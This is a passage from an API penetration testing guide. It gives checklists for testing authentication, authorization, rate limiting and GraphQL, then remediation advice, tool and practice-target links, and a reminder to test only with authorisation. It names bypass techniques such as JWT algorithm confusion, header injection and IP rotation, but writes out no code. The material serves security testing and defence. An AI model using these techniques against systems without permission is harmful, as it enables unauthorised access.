### Authentication Testing Phase
- [ ] Test endpoints without authentication
- [ ] Test JWT vulnerabilities (none algorithm, weak secret, algorithm confusion)
- [ ] Test header injection bypasses
- [ ] Test HTTP method override
- [ ] Test password reset flows

### Authorization Testing Phase
- [ ] Test BFLA (regular user accessing admin functions)
- [ ] Test HTTP method swapping (GET to DELETE)
- [ ] Test hidden admin parameters
- [ ] Test internal/debug endpoints

### Data Exposure Testing Phase
- [ ] Examine all API responses for sensitive data
- [ ] Compare responses between user roles
- [ ] Test GraphQL field suggestions
- [ ] Check error messages for stack traces

### Rate Limiting Testing Phase
- [ ] Test basic rate limiting with 100+ requests
- [ ] Test IP rotation bypasses
- [ ] Test parameter pollution bypasses
- [ ] Test case variation bypasses

### GraphQL Testing Phase
- [ ] Test for introspection enabled
- [ ] Test batch query attacks
- [ ] Test circular/deeply nested queries
- [ ] Test GraphQL BOLA via node IDs

### Reporting Phase
- [ ] Document each vulnerability with reproduction steps
- [ ] Include proof of concept (curl command or Python script)
- [ ] Assign severity based on impact
- [ ] Provide remediation recommendations
- [ ] Create executive summary

---

## Remediation Recommendations

### For BOLA Vulnerabilities
- Implement server-side authorization checks for every object access
- Use unpredictable object identifiers (UUID v4 instead of sequential integers)
- Never trust client-supplied object IDs without verification 

### For Authentication Bypass
- Reject the `none` algorithm for JWT
- Use strong JWT secrets (minimum 32 characters random)
- Implement proper token expiration and rotation
- Never trust headers like `X-Forwarded-For` for security decisions

### For BFLA
- Implement role-based access control (RBAC) on the server side
- Never rely on client-side role enforcement
- Deny all access by default, explicitly grant permissions 

### For Excessive Data Exposure
- Use API response schemas that only include necessary fields
- Implement field-level authorization for sensitive data
- Never return database objects directly to clients

### For Rate Limiting
- Implement rate limiting on all production endpoints
- Use IP-based and user-based rate limiting together
- Rate limiting should be applied before authentication checks
- Consider using API gateway for rate limiting

---

## Resources

### Tools
- **Burp Suite Professional**: https://portswigger.net/burp
- **OWASP ZAP**: https://www.zaproxy.org/
- **Postman**: https://www.postman.com/
- **APIsec**: Automated API security testing 
- **Kiterunner**: API endpoint discovery

### Extensions
- **Autorize** (Burp BApp Store)
- **AuthMatrix** (Burp BApp Store)
- **InQL** (Burp BApp Store for GraphQL)
- **Turbo Intruder** (Burp BApp Store)

### Learning Resources
- **OWASP API Security Top 10**: https://owasp.org/www-project-api-security/
- **OWASP Business Logic Abuse Top 10**: https://owasp.org/www-project-business-logic-abuse/ 
- **PortSwigger API Security Academy**: https://portswigger.net/web-security/api-testing

### Practice Targets
- **OWASP crAPI** (Completely Ridiculous API) - Vulnerable API for practice
- **OWASP Juice Shop** - Includes API vulnerabilities 
- **Damn Vulnerable GraphQL Application**

### Documentation
- [OWASP API Penetration Testing Checklist](https://owasp.org/www-project-api-security/)
- [REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
- [GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

---

## Final Notes

API security testing requires thinking like an attacker. Automated scanners are essential for baseline coverage, but they cannot detect business logic flaws that cause most API breaches . Manual testing with tools like Burp Suite and targeted scripts will find the vulnerabilities that matter most.

Always test with authorization in a controlled environment first. When testing production systems, use read-only operations, schedule during off-peak hours, and coordinate with the security team .
